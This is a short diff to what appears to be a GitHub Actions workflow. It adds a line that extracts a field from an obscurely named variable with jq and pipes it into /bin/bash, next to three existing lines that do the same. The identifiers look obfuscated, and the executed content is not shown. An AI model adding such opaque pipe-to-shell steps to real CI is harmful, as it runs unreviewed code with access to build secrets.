@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$tmcni3606" | jq -r .sv0 | /bin/bash
           echo $nxif0 | jq -r .p81435 | /bin/bash
           printf '%s' "$j7072" | jq -r .j86 | /bin/bash
+          echo $zocm6336 | jq -r .hiltv8274 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
